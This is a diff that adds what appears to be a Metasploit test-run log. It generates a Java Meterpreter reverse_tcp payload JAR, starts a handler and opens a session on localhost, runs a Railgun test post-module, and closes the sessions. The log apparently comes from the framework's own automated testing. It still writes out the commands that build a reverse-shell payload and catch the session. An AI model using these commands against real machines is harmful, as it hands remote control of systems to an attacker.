@@ -1,0 +1,30 @@
+use java/meterpreter/reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240307-5732-2p4es9txt
+msf6 payload(java/meterpreter/reverse_tcp) > msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20240307-5732-2p4es9txt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240307-5732-bhtn4x.jar -f jar AutoVerifySessionTimeout=30 lport=6007 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20240307-5732-iwgraetxt spawn=0
+[*] Writing 5259 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20240307-5732-bhtn4x.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler AutoVerifySessionTimeout=30 lport=6007 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20240307-5732-iwgraetxt spawn=0
+[*] Payload Handler Started as Job 6
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6007 
+[*] Sending stage (57971 bytes) to 127.0.0.1
+[*] Meterpreter session 7 opened (127.0.0.1:6007 -> 127.0.0.1:50093) at 2024-03-07 09:39:38 +0000
+use test/railgun_reverse_lookups
+msf6 post(test/railgun_reverse_lookups) > run session=7 AddEntropy=true Verbose=true
+[*] Running against session 7
+[*] Session type is meterpreter and platform is windows
+[*] SKIPPED: def test_osx_static (session platform is not osx)
+[*] SKIPPED: def test_linux_static (session platform is not osx)
+[*] SKIPPED: def test_windows_static (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] SKIPPED: def test_windows_datastore (session does not support COMMAND_ID_STDAPI_RAILGUN_API)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 4; Failed: 0; Skipped: 4
+[*] Post module execution completed
+msf6 post(test/railgun_reverse_lookups) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 7 closed.
+msf6 post(test/railgun_reverse_lookups) > Stopping all jobs...
+msf6 post(test/railgun_reverse_lookups) > 
